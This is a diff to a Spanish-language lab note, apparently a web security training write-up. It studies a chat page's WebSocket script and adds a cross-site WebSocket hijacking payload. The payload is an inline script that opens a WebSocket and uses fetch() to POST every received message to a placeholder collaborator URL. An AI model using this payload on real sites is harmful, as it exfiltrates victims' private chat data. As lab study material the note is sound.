@@ -11,7 +11,12 @@ si analizamos la petición podemos ver que la solicitud del mensaje se envía al
 analizamos el json `chat.js` Ese código es un script JavaScript autoejecutable que implementa la interfaz del chat en tiempo real y utiliza la función de WebSockets
 ![[Pasted image 20250729135359.png]]
 
-partiendo de esta idea podemos 
+partiendo de esta idea podemos crear nuestra conexión web socket para exfiltrar esta informacion
+
+```python
+<script> var ws = new WebSocket('wss://your-websocket-url'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage = function(event) { fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>
+```
+
 ![[Pasted image 20250729142914.png]]
 
 ![[Pasted image 20250729142857.png]]
